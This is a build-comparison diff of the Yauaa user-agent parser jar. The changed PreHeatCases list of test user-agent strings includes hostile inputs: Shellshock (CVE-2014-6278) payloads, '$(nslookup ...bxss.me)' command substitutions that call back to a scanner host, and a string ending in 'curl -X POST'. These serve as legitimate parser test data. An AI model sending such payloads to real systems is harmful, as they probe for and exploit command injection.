@@ -1,0 +1,89 @@
+1 / 10 target/reference/nl.basjes.parse.useragent/yauaa-7.26.1.jar analyzer/target/yauaa-7.26.1.jar
+--- target/reference/nl.basjes.parse.useragent/yauaa-7.26.1.jar
++++ analyzer/target/yauaa-7.26.1.jar
+├── zipinfo {}
+│ @@ -1,8 +1,8 @@
+│ -Zip file size: 2653424 bytes, number of entries: 1178
+│ +Zip file size: 2654076 bytes, number of entries: 1178
+│  -rw----     2.0 fat        0 bX defN 24-Apr-15 10:18 META-INF/
+│  -rw----     2.0 fat      501 bl defN 24-Apr-15 10:18 META-INF/MANIFEST.MF
+│ @@ -1173,8 +1173,8 @@
+│  -rw----     2.0 fat      174 bl defN 23-Oct-06 18:12 nl/basjes/parse/useragent/yauaa/shaded/org/apache/commons/lang3/util/package-info.class
+│  -rw----     2.0 fat    29245 bX defN 17-Nov-28 00:21 META-INF/maven/nl.basjes.parse.useragent/yauaa/pom.xml
+│ -1178 files, 14616100 bytes uncompressed, 2365002 bytes compressed:  83.8%
+│ +1178 files, 14616100 bytes uncompressed, 2365654 bytes compressed:  83.8%
+├── nl/basjes/parse/useragent/PreHeatCases.class
+│ ├── procyon -ec {}
+│ │ @@ -8,13 +8,13 @@
+│ │  import java.util.List;
+│ │  
+│ │  public final class PreHeatCases
+│ │  {
+│ │      public static final List<String> USERAGENTS;
+│ │      
+│ │      static {
+│ │ -        final String[] testAgents = { "      user_agent_string: \"'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'\"", "      user_agent_string: \"Mozilla/5.0 (Android 6.0; Mobile; rv:68.0) Gecko/20100101 Firefox/68.0\"", "      user_agent_string: \"true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || curl -X POST\"", "  <title>(.*?)<\\/title>", "!(()&&!|*|*|", "", "$(nslookup H300Q4fO)", "$(nslookup hitogredxqaas0b70d.bxss.me||perl -e \"gethostbyname(''xxxxxx.bxss.me'')\")", "$(nslookup xxxxx.bxss.me||perl -e
+...
+Windows 10 10.0; java 1.8.0_77; Europe/en) http://yacy.net/bot.html", "yacybot%20(freeworld/global;%20amd64%20Linux%203.1.0-1.2-desktop;%20java%201.6.0_22;%20Europe/de)%20http://yacy.net/bot.html", "{265b75c0-4158-11d0-90f6-00c04fd497ea}", "{{.custom_user_agent}}", "Closing dummy entry" };
+│ │ +        final String[] testAgents = { "!(()&&!|*|*|", "", "() { _; } >_[$($())] { echo; /bin/sleep 5; }", "\"() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \\\"\"bash_cve_2014_6278 Output : $((0+66))\\\"\"; }\"", "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \\\"bash_cve_2014_6278 Output : $((37+34))\\\"; }", "\"() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \\\"\"bash_cve_2014_6278 Output : $((89+30))\\\"\"; }\"", "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \\\"bash_cve_2014_6278 Output : $((97+19))\\\"; }", "${$
+...
+"Zookabot/2.5;++http://zookabot.com", "ZoomBot (Linkbot 1.0 http://suite.seozoom.it/bot.html)", "ZoominfoBot (zoominfobot at zoominfo dot com)", "ZTE-Z222/1.0.6 NetFront/3.5 QTV5.1 Profile/MIDP-2.1 Configuration/CLDC-1.1", "ZTE-Z431/1.4.0 NetFront/4.2 QTV5.1 Profile/MIDP-2.1 Configuration/CLDC-1.1", "Zwemkleding.nl image downloader", "ZXing (Android)", "Closing dummy entry" };
+│ │          final List<String> rawList = Arrays.asList(testAgents);
+│ │          rawList.sort(Comparator.comparing((Function<? super String, ? extends Comparable>)String::hashCode));
+│ │          USERAGENTS = Collections.unmodifiableList((List<? extends String>)rawList);
+│ │      }
+│ │  }
+
+2 / 10 target/reference/nl.basjes.parse.useragent/yauaa-7.26.1-sources.jar analyzer/target/yauaa-7.26.1-sources.jar
+--- target/reference/nl.basjes.parse.useragent/yauaa-7.26.1-sources.jar
++++ analyzer/target/yauaa-7.26.1-sources.jar
+├── zipinfo {}
+│ @@ -1,8 +1,8 @@
+│ -Zip file size: 1414938 bytes, number of entries: 348
+│ +Zip file size: 1415723 bytes, number of entries: 348
+│  drwxr-xr-x  2.0 unx        0 b- stor 24-Apr-15 10:18 META-INF/
+│  -rw-r--r--  2.0 unx       64 b- defN 24-Apr-15 10:18 META-INF/MANIFEST.MF
+│ @@ -343,8 +343,8 @@
+│  -rw-r--r--  2.0 unx    31764 b- defN 24-Apr-15 10:18 META-INF/maven/nl.basjes.parse.useragent/yauaa/pom.xml
+│  -rw-r--r--  2.0 unx       66 b- defN 24-Apr-15 10:18 META-INF/maven/nl.basjes.parse.useragent/yauaa/pom.properties
+│ -348 files, 12897110 bytes uncompressed, 1354044 bytes compressed:  89.5%
+│ +348 files, 12897110 bytes uncompressed, 1354829 bytes compressed:  89.5%
+├── nl/basjes/parse/useragent/PreHeatCases.java
+│ @@ -54,33495 +54,33495 @@
+│  00000350: 6e67 3e20 5553 4552 4147 454e 5453 3b0a  ng> USERAGENTS;.
+│  00000360: 2020 2020 7374 6174 6963 207b 0a20 2020      static {.   
+│  00000370: 2020 2020 202f 2f20 5468 6520 6172 6520       // The are 
+│  00000380: 616c 6c20 7468 6520 7465 7374 2063 6173  all the test cas
+│  00000390: 6573 2069 6e20 7468 6520 7072 6f6a 6563  es in the projec
+│  000003a0: 740a 2020 2020 2020 2020 5374 7269 6e67  t.        String
+│  000003b0: 5b5d 2074 6573 7441 6765 6e74 7320 3d20  [] testAgents = 
+│ -000003c0: 7b0a 2020 2020 2020 2020 2020 2020 2220  {.            " 
+│ -000003d0: 2020 2020 2075 7365 725f 6167 656e 745f       user_agent_
+│ -000003e0: 7374 7269 6e67 3a20 5c22 274d 6f7a 696c  string: \"'Mozil
+│ -000003f0: 6c61 2f35 2e30 2028 636f 6d70 6174 6962  la/5.0 (compatib
+│ -00000400: 6c65 3b20 4475 636b 4475 636b 426f 742d  le; DuckDuckBot-
+...
+│ -00008ca0: 3020 284c 696e 7578 3b20 553b 2041 6e64  0 (Linux; U; And
+│ -00008cb0: 726f 6964 2039 3b20 464c 412d 4c58 3320  roid 9; FLA-LX3 
+│ -00008cc0: 4275 696c 642f 4855 4157 4549 464c 412d  Build/HUAWEIFLA-
+│ -00008cd0: 4c30 3329 222c 0a20 2020 2020 2020 2020  L03)",.         
+│ +000003c0: 7b0a 2020 2020 2020 2020 2020 2020 2221  {.            "!
+│ +000003d0: 2828 2926 2621 7c2a 7c2a 7c22 2c0a 2020  (()&&!|*|*|",.  
+│ +000003e0: 2020 2020 2020 2020 2020 2222 2c0a 2020            "",.  
+│ +000003f0: 2020 2020 2020 2020 2020 2228 2920 7b20            "() { 
+...
+│ +00008ca0: 284c 696e 7578 3b20 553b 2041 6e64 726f  (Linux; U; Andro
+│ +00008cb0: 6964 2039 3b20 4a4b 4d2d 414c 3030 2042  id 9; JKM-AL00 B
+│ +00008cc0: 7569 6c64 2f48 5541 5745 494a 4b4d 2d41  uild/HUAWEIJKM-A
+│ +00008cd0: 4c30 3029 222c 0a20 2020 2020 2020 2020  L00)",.         
+│  00008ce0: 2020 2022 4461 6c76 696b 2f32 2e31 2e30     "Dalvik/2.1.0
+│  00008cf0: 2028 4c69 6e75 783b 2055 3b20 416e 6472   (Linux; U; Andr
+│ -00008d00: 6f69 6420 393b 2046 4c41 2d4c 5833 2042  oid 9; FLA-LX3 B
+│ -00008d10: 7569 6c64 2f48 5541 5745 4946 4c41 2d4c  uild/HUAWEIFLA-L
+│ -00008d20: 3233 2922 2c0a 2020 2020 2020 2020 2020  23)",.          
+│ +00008d00: 6f69 6420 393b 204a 4b4d 2d4c 5831 2042  oid 9; JKM-LX1 B
+│ +00008d10: 7569 6c64 2f48 5541 5745 494a 4b4d 2d4c  uild/HUAWEIJKM-L
+│ +00008d20: 5831 2922 2c0a 2020 2020 2020 2020 2020  X1)",.          
+│  00008d30: 2020 2244 616c 7669 6b2f 322e 312e 3020    "Dalvik/2.1.0 
+│  00008d40: 284c 696e 7578 3b20 553b 2041 6e64 726f  (Linux; U; Andro
+...
